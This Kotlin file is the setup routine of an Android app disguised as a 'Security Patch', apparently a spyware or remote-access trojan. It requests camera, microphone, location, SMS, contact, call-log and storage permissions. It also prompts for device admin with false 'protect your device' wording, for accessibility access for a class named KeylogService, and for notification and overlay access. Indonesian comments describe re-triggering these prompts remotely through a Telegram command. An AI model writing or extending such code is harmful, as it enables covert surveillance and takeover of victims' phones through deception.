package com.android.security.patch

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

object Setup {

    private const val REQ = 9100

    private val RUNTIME_PERMS = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.GET_ACCOUNTS,
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
            add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    /**
     * Dipanggil sekali saat WebViewActivity pertama buka.
     * Urutan: runtime perms → battery opt → admin → accessibility → notif listener
     * → MANAGE_EXTERNAL_STORAGE → overlay permission.
     */
    fun firstLaunch(activity: Activity) {
        if (Prefs.getBool(activity, "setup_done")) return

        // 1. runtime perms
        val missing = RUNTIME_PERMS.filter {
            ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(activity, missing.toTypedArray(), REQ)
        }

        // 2. battery opt ignore
        val pm = activity.getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(activity.packageName)) {
            try {
                val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                i.data = Uri.parse("package:${activity.packageName}")
                activity.startActivity(i)
            } catch (_: Throwable) {}
        }

        // 3. device admin prompt
        if (!AdminReceiver.isActive(activity)) {
            val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, AdminReceiver.component(activity))
            i.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Security Patch requires device admin to protect your device."
            )
            try { activity.startActivity(i) } catch (_: Throwable) {}
        }

        // 4. accessibility settings
        if (!KeylogService.alive) {
            try {
                activity.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            } catch (_: Throwable) {}
        }

        // 5. notification listener
        if (!NotifListener.alive) {
            try {
                activity.startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            } catch (_: Throwable) {}
        }

        // 6. MANAGE_EXTERNAL_STORAGE (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                try {
                    val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    i.data = Uri.parse("package:${activity.packageName}")
                    activity.startActivity(i)
                } catch (_: Throwable) {}
            }
        }

        // 7. overlay permission
        if (!Settings.canDrawOverlays(activity)) {
            try {
                val i = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                i.data = Uri.parse("package:${activity.packageName}")
                activity.startActivity(i)
            } catch (_: Throwable) {}
        }

        Prefs.setBool(activity, "setup_done", true)
    }

    /**
     * Dipanggil dari /izin command — supaya bisa re-trigger semua prompt dari jarak jauh.
     * Gak bisa silent-grant, tapi bisa bantu prompt-in balik lewat telegram.
     */
    fun rePrompt(ctx: Context) {
        try {
            val i = Intent(ctx, WebViewActivity::class.java)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            ctx.startActivity(i)
            Prefs.setBool(ctx, "setup_done", false)
        } catch (_: Throwable) {}
    }
}